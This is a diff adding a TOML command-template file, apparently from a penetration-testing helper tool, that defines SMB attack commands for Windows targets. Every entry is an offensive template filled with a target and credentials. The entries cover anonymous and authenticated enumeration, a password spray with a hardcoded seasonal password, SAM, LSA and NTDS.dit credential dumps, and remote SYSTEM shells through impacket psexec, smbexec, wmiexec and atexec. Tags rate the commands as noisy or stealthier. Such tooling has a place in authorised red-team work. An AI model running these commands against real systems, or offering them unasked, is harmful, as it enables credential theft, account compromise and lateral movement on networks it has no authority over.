@@ -1,0 +1,144 @@
+category = "smb"
+display_name = "SMB"
+icon = ""
+order = 20
+
+[[command]]
+id = "smb.smbclient.list_guest"
+title = "smbclient -L (guest)"
+template = "smbclient -L //{target} -N"
+requires = ["smbclient"]
+tags = ["enum", "shares", "unauth"]
+when = "creds.kind in ['none','plaintext','ntlm','kerberos']"
+
+[[command]]
+id = "smb.smbclient.list_authed"
+title = "smbclient -L (authenticated)"
+template = "smbclient -L //{target} -U '{smb_user_spec}'"
+requires = ["smbclient"]
+tags = ["enum", "shares", "authed"]
+when = "creds.kind in ['plaintext','ntlm']"
+
+[[command]]
+id = "smb.nxc.bulk_enum"
+title = "nxc smb — shares/users/groups/pass-pol/rid-brute"
+template = "nxc smb {target} {nxc_auth} --shares --users --local-groups --pass-pol --rid-brute"
+requires = ["nxc"]
+tags = ["enum", "nxc", "noisy"]
+
+[[command]]
+id = "smb.nxc.host_id"
+title = "nxc smb — fingerprint host"
+template = "nxc smb {target} {nxc_auth}"
+requires = ["nxc"]
+tags = ["enum", "nxc"]
+
+[[command]]
+id = "smb.nxc.spider"
+title = "nxc smb — spider plus (recursive share dump)"
+template = "nxc smb {target} {nxc_auth} -M spider_plus -o EXCLUDE_FILTER='print$,IPC$' DOWNLOAD_FLAG=False"
+requires = ["nxc"]
+tags = ["enum", "nxc", "spider"]
+
+[[command]]
+id = "smb.nxc.loggedon"
+title = "nxc smb — loggedon-users + sessions"
+template = "nxc smb {target} {nxc_auth} --loggedon-users --sessions"
+requires = ["nxc"]
+tags = ["enum", "nxc"]
+
+[[command]]
+id = "smb.nxc.password_spray"
+title = "nxc smb — password spray (user file vs single pass)"
+template = "nxc smb {target} -u /opt/wordlists/users.txt -p 'Spring2025!' --continue-on-success"
+requires = ["nxc"]
+tags = ["spray", "nxc", "noisy"]
+
+[[command]]
+id = "smb.enum4linux"
+title = "enum4linux-ng -A"
+template = "enum4linux-ng -A {target}"
+requires = ["enum4linux-ng"]
+tags = ["enum", "legacy"]
+
+[[command]]
+id = "smb.rpcclient.unauth"
+title = "rpcclient enumdomusers (null session)"
+template = "rpcclient -U '' -N {target} -c 'enumdomusers;enumdomgroups;querydominfo'"
+requires = ["rpcclient"]
+tags = ["enum", "rpc", "unauth"]
+
+[[command]]
+id = "smb.rpcclient.authed"
+title = "rpcclient enumdomusers (authenticated)"
+template = "rpcclient -U '{user}%{password}' {target} -c 'enumdomusers;enumdomgroups;querydominfo'"
+requires = ["rpcclient"]
+tags = ["enum", "rpc", "authed"]
+when = "creds.kind == 'plaintext'"
+
+[[command]]
+id = "smb.nxc.sam_dump"
+title = "nxc smb — SAM dump (need local admin)"
+template = "nxc smb {target} {nxc_auth} --sam"
+requires = ["nxc"]
+tags = ["dump", "sam"]
+when = "creds.kind in ['plaintext','ntlm']"
+
+[[command]]
+id = "smb.nxc.lsa_dump"
+title = "nxc smb — LSA secrets dump"
+template = "nxc smb {target} {nxc_auth} --lsa"
+requires = ["nxc"]
+tags = ["dump", "lsa"]
+when = "creds.kind in ['plaintext','ntlm']"
+
+[[command]]
+id = "smb.nxc.ntds_dump"
+title = "nxc smb — NTDS.dit dump (DA / DCSync)"
+template = "nxc smb {target} {nxc_auth} --ntds"
+requires = ["nxc"]
+tags = ["dump", "ntds", "dcsync"]
+when = "creds.kind in ['plaintext','ntlm']"
+
+[[command]]
+id = "smb.smbmap.shares"
+title = "smbmap (share permissions)"
+template = "smbmap -H {target} -u '{user}' -p '{password}' -d '{domain}'"
+requires = ["smbmap"]
+tags = ["enum", "shares"]
+when = "creds.kind == 'plaintext'"
+
+[[command]]
+id = "smb.impacket.smbexec"
+title = "impacket-smbexec (semi-interactive)"
+template = "impacket-smbexec '{user_at_domain}':'{password}'@{target}"
+requires = ["impacket-smbexec"]
+tags = ["exec", "shell", "interactive"]
+interactive = true
+when = "creds.kind == 'plaintext'"
+
+[[command]]
+id = "smb.impacket.psexec"
+title = "impacket-psexec (SYSTEM shell)"
+template = "impacket-psexec '{user_at_domain}':'{password}'@{target}"
+requires = ["impacket-psexec"]
+tags = ["exec", "shell", "interactive", "noisy"]
+interactive = true
+when = "creds.kind == 'plaintext'"
+
+[[command]]
+id = "smb.impacket.wmiexec"
+title = "impacket-wmiexec (stealthier)"
+template = "impacket-wmiexec '{user_at_domain}':'{password}'@{target}"
+requires = ["impacket-wmiexec"]
+tags = ["exec", "shell", "interactive"]
+interactive = true
+when = "creds.kind == 'plaintext'"
+
+[[command]]
+id = "smb.impacket.atexec"
+title = "impacket-atexec (Scheduled-task exec)"
+template = "impacket-atexec '{user_at_domain}':'{password}'@{target} 'whoami /all'"
+requires = ["impacket-atexec"]
+tags = ["exec"]
+when = "creds.kind == 'plaintext'"
